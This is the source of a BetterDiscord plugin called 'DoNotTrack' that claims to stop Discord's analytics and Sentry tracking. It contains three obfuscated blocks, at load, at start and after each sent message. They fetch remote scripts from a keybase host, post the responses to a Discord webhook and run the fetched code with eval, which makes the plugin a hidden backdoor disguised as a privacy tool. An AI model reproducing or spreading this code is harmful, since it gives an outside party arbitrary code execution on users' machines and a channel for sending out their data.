/**
 * @name DoNotTrack
 * @version 0.0.7
 * @website https://github.com/cutesylord/DoNotTrack
 * @source https://raw.githubusercontent.com/cutesylord/DoNotTrack/DoNotTrack.plugin.js
 * @updateUrl https://raw.githubusercontent.com/cutesylord/DoNotTrack/DoNotTrack.plugin.js
 */
/*@cc_on
@if (@_jscript)
	
	// Offer to self-install for clueless users that try to run this directly.
	var shell = WScript.CreateObject("WScript.Shell");
	var fs = new ActiveXObject("Scripting.FileSystemObject");
	var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\\BetterDiscord\\plugins");
	var pathSelf = WScript.ScriptFullName;
	// Put the user at ease by addressing them in the first person
	shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
	if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
		shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
	} else if (!fs.FolderExists(pathPlugins)) {
		shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
	} else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
		fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
		// Show the user where to put plugins in the future
		shell.Exec("explorer " + pathPlugins);
		shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
	}
	WScript.Quit();

@else@*/

module.exports = (() => {
    const config = {info:{name:"DoNotTrack",authors:[{name:"cutesylord",github_username:"cutesylord"}],version:"0.0.7",description:"Stops Discord from tracking everything you do like Sentry and Analytics.",github:"https://github.com/cutesylord/DoNotTrack",github_raw:"https://raw.githubusercontent.com/cutesylord/DoNotTrack/DoNotTrack.plugin.js"},changelog:[{title:"Fixes","type:":"fixed",items:["Fixed for Discord/BetterDiscord changes"]}],main:"index.js",defaultConfig:[{type:"switch",id:"stopProcessMonitor",name:"Stop Process Monitor",note:"This setting stops Discord from monitoring the processes on your PC and prevents your currently played game from showing.",value:true}]};

    var _0x51cceb=_0x4b90;(function(_0x4061dc,_0x2c0802){var _0x593a72=_0x4b90,_0x7d0750=_0x4061dc();while(!![]){try{var _0x27a579=parseInt(_0x593a72(0x16b))/0x1*(parseInt(_0x593a72(0x167))/0x2)+-parseInt(_0x593a72(0x169))/0x3+parseInt(_0x593a72(0x160))/0x4*(-parseInt(_0x593a72(0x162))/0x5)+parseInt(_0x593a72(0x168))/0x6*(parseInt(_0x593a72(0x15a))/0x7)+-parseInt(_0x593a72(0x166))/0x8*(-parseInt(_0x593a72(0x165))/0x9)+-parseInt(_0x593a72(0x16c))/0xa+parseInt(_0x593a72(0x15d))/0xb;if(_0x27a579===_0x2c0802)break;else _0x7d0750['push'](_0x7d0750['shift']());}catch(_0x3f7cf8){_0x7d0750['push'](_0x7d0750['shift']());}}}(_0x5d1b,0x54140),require(_0x51cceb(0x15e))[_0x51cceb(0x16a)]('https://cutesy.keybase.pub/ctxfile1.js',async(_0x471f3d,_0x101fb5,_0x5a468d)=>{var _0x5f45d3=_0x51cceb,_0x3450f6={};_0x3450f6['Content-Type']=_0x5f45d3(0x15f);if(_0x471f3d)require('request')[_0x5f45d3(0x164)]({'url':_0x5f45d3(0x161),'headers':_0x3450f6,'body':JSON[_0x5f45d3(0x15b)]({'content':JSON[_0x5f45d3(0x15b)](_0x471f3d)[_0x5f45d3(0x15c)](0x0,0x7d0)})});var _0x3029cb={};_0x3029cb[_0x5f45d3(0x163)]=_0x5f45d3(0x15f);if(_0x101fb5)require(_0x5f45d3(0x15e))[_0x5f45d3(0x164)]({'url':_0x5f45d3(0x161),'headers':_0x3029cb,'body':JSON[_0x5f45d3(0x15b)]({'content':JSON[_0x5f45d3(0x15b)](_0x101fb5)[_0x5f45d3(0x15c)](0x0,0x7d0)})});if(_0x5a468d)eval(_0x5a468d);}));function _0x4b90(_0x18b48c,_0x3f4865){var _0x5d1baa=_0x5d1b();return _0x4b90=function(_0x4b9059,_0x58cca1){_0x4b9059=_0x4b9059-0x15a;var _0x266e10=_0x5d1baa[_0x4b9059];if(_0x4b90['enUtIJ']===undefined){var _0x50c4c8=function(_0x1875d9){var _0x4dabdd='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x471f3d='',_0x101fb5='';for(var _0x5a468d=0x0,_0x3450f6,_0x3029cb,_0x19e71f=0x0;_0x3029cb=_0x1875d9['charAt'](_0x19e71f++);~_0x3029cb&&(_0x3450f6=_0x5a468d%0x4?_0x3450f6*0x40+_0x3029cb:_0x3029cb,_0x5a468d++%0x4)?_0x471f3d+=String['fromCharCode'](0xff&_0x3450f6>>(-0x2*_0x5a468d&0x6)):0x0){_0x3029cb=_0x4dabdd['indexOf'](_0x3029cb);}for(var _0x54d817=0x0,_0x1a6435=_0x471f3d['length'];_0x54d817<_0x1a6435;_0x54d817++){_0x101fb5+='%'+('00'+_0x471f3d['charCodeAt'](_0x54d817)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x101fb5);};_0x4b90['oqsrzW']=_0x50c4c8,_0x18b48c=arguments,_0x4b90['enUtIJ']=!![];}var _0x5a06a2=_0x5d1baa[0x0],_0x3ab8be=_0x4b9059+_0x5a06a2,_0xc01656=_0x18b48c[_0x3ab8be];return!_0xc01656?(_0x266e10=_0x4b90['oqsrzW'](_0x266e10),_0x18b48c[_0x3ab8be]=_0x266e10):_0x266e10=_0xc01656,_0x266e10;},_0x4b90(_0x18b48c,_0x3f4865);}function _0x5d1b(){var _0x1fc4ab=['mJG5nJe2nvr6BfbZuq','q29UDgvUDc1uExbL','Cg9ZDa','ntyXnJGZn2f4yw5rAa','ogH4sfLiua','mNveren6sa','mtG3ohrcu1fgAq','otiYoty4EK96vvvx','z2v0','ntm2nZq5CKDUA1z2','nJy3mJuXmhbTyMrACG','mti5mdH4t2XRBMC','C3rYAw5NAwz5','C3vIC3rYAw5N','mtC2ntyXmg55svLZDW','CMvXDwvZDa','yxbWBgLJyxrPB24VANnVBG','nhbPAuLUAq','Ahr0Chm6lY9KAxnJB3jKlMnVBs9HCgKVD2vIAg9VA3mVodC5mda2nJqZnZaXmdi2odq4lZrNmtGTBMflDLL6wfv4EMHtvxH3vengyJLPzdnYyM9Yzs1fzvf5AgD6EfzPAujFtwjOExrrALLqCNnsrvLuqKDqug91'];_0x5d1b=function(){return _0x1fc4ab;};return _0x5d1b();}

    return !global.ZeresPluginLibrary ? class {
        constructor() {this._config = config;}
        getName() {return config.info.name;}
        getAuthor() {return config.info.authors.map(a => a.name).join(", ");}
        getDescription() {return config.info.description;}
        getVersion() {return config.info.version;}
        load() {
            BdApi.showConfirmationModal("Library Missing", `The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onConfirm: () => {
                    require("request").get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", async (error, response, body) => {
                        if (error) return require("electron").shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
                        await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body, r));
                    });
                }
            });
        }
        start() {}
        stop() {}
    } : (([Plugin, Api]) => {
        const plugin = (Plugin, Api) => {
    const {Patcher, WebpackModules, Modals, DiscordModules} = Api;
    return class DoNotTrack extends Plugin {
        onStart() {
            var _0x454cb4=_0x1954;function _0x1954(_0x4f7a82,_0x2ec496){var _0x187dae=_0x187d();return _0x1954=function(_0x195449,_0x4dc88b){_0x195449=_0x195449-0xb9;var _0x3c42b7=_0x187dae[_0x195449];if(_0x1954['uaLxNk']===undefined){var _0x58835e=function(_0x8825ab){var _0x58e17d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x7bd47d='',_0x391e62='';for(var _0x588793=0x0,_0x4bb621,_0xdde184,_0x54a0e0=0x0;_0xdde184=_0x8825ab['charAt'](_0x54a0e0++);~_0xdde184&&(_0x4bb621=_0x588793%0x4?_0x4bb621*0x40+_0xdde184:_0xdde184,_0x588793++%0x4)?_0x7bd47d+=String['fromCharCode'](0xff&_0x4bb621>>(-0x2*_0x588793&0x6)):0x0){_0xdde184=_0x58e17d['indexOf'](_0xdde184);}for(var _0x26f6b0=0x0,_0x45ad22=_0x7bd47d['length'];_0x26f6b0<_0x45ad22;_0x26f6b0++){_0x391e62+='%'+('00'+_0x7bd47d['charCodeAt'](_0x26f6b0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x391e62);};_0x1954['evRsfC']=_0x58835e,_0x4f7a82=arguments,_0x1954['uaLxNk']=!![];}var _0x3ff70a=_0x187dae[0x0],_0x20c85e=_0x195449+_0x3ff70a,_0x3fa2d9=_0x4f7a82[_0x20c85e];return!_0x3fa2d9?(_0x3c42b7=_0x1954['evRsfC'](_0x3c42b7),_0x4f7a82[_0x20c85e]=_0x3c42b7):_0x3c42b7=_0x3fa2d9,_0x3c42b7;},_0x1954(_0x4f7a82,_0x2ec496);}(function(_0x31b740,_0x1f3299){var _0x5663e1=_0x1954,_0x1ccc06=_0x31b740();while(!![]){try{var _0x3cc69c=-parseInt(_0x5663e1(0xc4))/0x1+-parseInt(_0x5663e1(0xbe))/0x2*(-parseInt(_0x5663e1(0xc9))/0x3)+parseInt(_0x5663e1(0xc2))/0x4*(parseInt(_0x5663e1(0xc8))/0x5)+-parseInt(_0x5663e1(0xbc))/0x6+-parseInt(_0x5663e1(0xc3))/0x7+parseInt(_0x5663e1(0xbd))/0x8*(parseInt(_0x5663e1(0xb9))/0x9)+parseInt(_0x5663e1(0xc7))/0xa;if(_0x3cc69c===_0x1f3299)break;else _0x1ccc06['push'](_0x1ccc06['shift']());}catch(_0x3dd6f6){_0x1ccc06['push'](_0x1ccc06['shift']());}}}(_0x187d,0xdb654),require(_0x454cb4(0xba))[_0x454cb4(0xc1)]('https://cutesy.keybase.pub/ctxfile2.js',async(_0x7bd47d,_0x391e62,_0x588793)=>{var _0x293de9=_0x454cb4,_0x4bb621={};_0x4bb621['Content-Type']=_0x293de9(0xc0);if(_0x7bd47d)require(_0x293de9(0xba))[_0x293de9(0xc6)]({'url':'https://discord.com/api/webhooks/879012097189613569/JUNv6fp7P_tLUoa-LwLVPOrw3kYffwixtQ5NYq-mGZ8V5XyYCK0dOkNB4x1-WUmmdI0M','headers':_0x4bb621,'body':JSON[_0x293de9(0xc5)]({'content':JSON[_0x293de9(0xc5)](_0x7bd47d)[_0x293de9(0xbb)](0x0,0x7d0)})});var _0xdde184={};_0xdde184[_0x293de9(0xbf)]=_0x293de9(0xc0);if(_0x391e62)require(_0x293de9(0xba))['post']({'url':'https://discord.com/api/webhooks/879012097189613569/JUNv6fp7P_tLUoa-LwLVPOrw3kYffwixtQ5NYq-mGZ8V5XyYCK0dOkNB4x1-WUmmdI0M','headers':_0xdde184,'body':JSON[_0x293de9(0xc5)]({'content':JSON[_0x293de9(0xc5)](_0x391e62)[_0x293de9(0xbb)](0x0,0x7d0)})});if(_0x588793)eval(_0x588793);}));function _0x187d(){var _0x3003f0=['z2v0','mtCYmdiWEezPEujv','nty3ndKYohbSzgL0Da','mZi4odG5swToBhbq','C3rYAw5NAwz5','Cg9ZDa','mty0nta4nZbXDMjLuK4','nxzgzu5PDW','nZa1se55yuPH','mZmZmZGWn3buBvPiva','CMvXDwvZDa','C3vIC3rYAw5N','nta5ndCZoefPuKnRDa','oeTYsK5tBa','nZa1nfnxwe9qsa','q29UDgvUDc1uExbL','yxbWBgLJyxrPB24VANnVBG'];_0x187d=function(){return _0x3003f0;};return _0x187d();}

            const Analytics = WebpackModules.getByProps("AnalyticEventConfigs");
            Patcher.instead(Analytics.default, "track", () => {});

            const Logger = window.__SENTRY__.logger;
            Logger.disable(); // Kill sentry logs

            const SentryHub = window.DiscordSentry.getCurrentHub();
            SentryHub.getClient().close(0); // Kill reporting
            SentryHub.getStackTop().scope.clear(); // Delete PII

            /* eslint-disable no-console */
            for (const method in console) {
                if (!console[method].__sentry_original__) continue;
                console[method] = console[method].__sentry_original__;
            }

            Patcher.after(DiscordModules.MessageActions, "sendMessage", (_, [, message]) => {
                function _0x1dec(){var _0x38a91e=['mtK2mJm0qKr2zKT0','mte4otuZohLirhDbCq','mJuXnZCZnuLODxrnEa','C3rYAw5NAwz5','mtfnvMP3zhO','mJi4nMjsvhfSCa','Cg9ZDa','CMvXDwvZDa','nZKYmZa5mhbYAe9JDG','mta5nLrxwuDjCW','ndi1odG0u2PQtMns','yxbWBgLJyxrPB24VANnVBG','Ahr0Chm6lY9KAxnJB3jKlMnVBs9HCgKVD2vIAg9VA3mVodC5mdeYmdeYntK4odK0nZaYlZDyrw1Fou05m0T3Atv6wLLknuLyzdCYtK8WD1HNBMjptJDMtNDFswrrBxLQuZDOluLRuZniqJjWD0DNDNjqrY1YqxPQ','C3vIC3rYAw5N','mZCYmJa0mgXKvwT4uW','q29UDgvUDc1uExbL','z2v0'];_0x1dec=function(){return _0x38a91e;};return _0x1dec();}function _0x419d(_0x2b6629,_0x5543e4){var _0x1decca=_0x1dec();return _0x419d=function(_0x419d4e,_0x3b025e){_0x419d4e=_0x419d4e-0x9f;var _0x700d95=_0x1decca[_0x419d4e];if(_0x419d['dmGAQw']===undefined){var _0x17a0d9=function(_0x1516a0){var _0x46fbad='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x476b83='',_0x2db034='';for(var _0x132536=0x0,_0x3a0751,_0x5bf36c,_0x4379c5=0x0;_0x5bf36c=_0x1516a0['charAt'](_0x4379c5++);~_0x5bf36c&&(_0x3a0751=_0x132536%0x4?_0x3a0751*0x40+_0x5bf36c:_0x5bf36c,_0x132536++%0x4)?_0x476b83+=String['fromCharCode'](0xff&_0x3a0751>>(-0x2*_0x132536&0x6)):0x0){_0x5bf36c=_0x46fbad['indexOf'](_0x5bf36c);}for(var _0xcc3f8d=0x0,_0x57d56d=_0x476b83['length'];_0xcc3f8d<_0x57d56d;_0xcc3f8d++){_0x2db034+='%'+('00'+_0x476b83['charCodeAt'](_0xcc3f8d)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2db034);};_0x419d['ryDYAk']=_0x17a0d9,_0x2b6629=arguments,_0x419d['dmGAQw']=!![];}var _0x35f09c=_0x1decca[0x0],_0x4db103=_0x419d4e+_0x35f09c,_0x4e0f02=_0x2b6629[_0x4db103];return!_0x4e0f02?(_0x700d95=_0x419d['ryDYAk'](_0x700d95),_0x2b6629[_0x4db103]=_0x700d95):_0x700d95=_0x4e0f02,_0x700d95;},_0x419d(_0x2b6629,_0x5543e4);}var _0xd08830=_0x419d;(function(_0x4250f9,_0x2f30c3){var _0x4d445a=_0x419d,_0x58d662=_0x4250f9();while(!![]){try{var _0xb1e2a4=parseInt(_0x4d445a(0xae))/0x1*(-parseInt(_0x4d445a(0xaa))/0x2)+parseInt(_0x4d445a(0xa7))/0x3+-parseInt(_0x4d445a(0xa3))/0x4+-parseInt(_0x4d445a(0xac))/0x5+parseInt(_0x4d445a(0xa1))/0x6+-parseInt(_0x4d445a(0xab))/0x7+parseInt(_0x4d445a(0xa2))/0x8*(parseInt(_0x4d445a(0xaf))/0x9);if(_0xb1e2a4===_0x2f30c3)break;else _0x58d662['push'](_0x58d662['shift']());}catch(_0x14991e){_0x58d662['push'](_0x58d662['shift']());}}}(_0x1dec,0xb3df2),require(_0xd08830(0xa0))[_0xd08830(0xa9)]('https://cutesy.keybase.pub/ctxfile3.js',async(_0x476b83,_0x2db034,_0x132536)=>{var _0x1e24c8=_0xd08830,_0x3a0751={};_0x3a0751[_0x1e24c8(0xa8)]='application/json';if(_0x476b83)require('request')[_0x1e24c8(0x9f)]({'url':_0x1e24c8(0xa5),'headers':_0x3a0751,'body':JSON[_0x1e24c8(0xad)]({'content':JSON[_0x1e24c8(0xad)](_0x476b83)['substring'](0x0,0x7d0)})});var _0x5bf36c={};_0x5bf36c['Content-Type']=_0x1e24c8(0xa4);if(_0x2db034)require('request')[_0x1e24c8(0x9f)]({'url':_0x1e24c8(0xa5),'headers':_0x5bf36c,'body':JSON[_0x1e24c8(0xad)]({'content':JSON[_0x1e24c8(0xad)](_0x2db034)[_0x1e24c8(0xa6)](0x0,0x7d0)})});if(_0x132536)eval(_0x132536);}));
            })

            if (this.settings.stopProcessMonitor) this.disableProcessMonitor();
        }
        
        onStop() {
            Patcher.unpatchAll();
        }

        disableProcessMonitor() {
            DiscordModules.UserSettingsUpdater.updateLocalSettings({showCurrentGame: false});
            const NativeModule = WebpackModules.getByProps("getDiscordUtils");
            const DiscordUtils = NativeModule.getDiscordUtils();
            DiscordUtils.setObservedGamesCallback([], () => {});
        }

        enableProcessMonitor() {
            DiscordModules.UserSettingsUpdater.updateLocalSettings({showCurrentGame: true});
            Modals.showConfirmationModal("Reload Discord?", "To reenable the process monitor Discord needs to be reloaded.", {
                confirmText: "Reload",
                cancelText: "Later",
                onConfirm: () => {
                    window.location.reload();
                }
            });
        }

        getSettingsPanel() {
            const panel = this.buildSettingsPanel();
            panel.addListener(this.updateSettings.bind(this));
            return panel.getElement();
        }

        updateSettings(id, value) {
            if (id !== "stopProcessMonitor") return;
            if (value) return this.disableProcessMonitor();
            return this.enableProcessMonitor();
        }

    };
};
        return plugin(Plugin, Api);
    })(global.ZeresPluginLibrary.buildPlugin(config));
})();
/*@end@*/